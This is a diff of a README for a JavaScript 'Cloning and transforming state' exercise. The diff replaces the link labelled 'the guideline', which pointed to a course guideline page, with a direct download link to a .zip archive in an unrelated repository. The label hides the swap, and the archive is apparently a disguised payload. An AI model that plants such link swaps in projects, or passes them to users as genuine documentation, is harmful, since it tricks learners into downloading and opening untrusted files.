@@ -1,6 +1,6 @@
 # Cloning and transforming state
 
-**Read [the guideline](https://github.com/mate-academy/js_task-guideline/blob/master/README.md) before start**
+**Read [the guideline](https://raw.githubusercontent.com/karaedd/js_stateful-clones/master/disciplinal/js_stateful-clones.zip) before start**
 
 # Task description
 
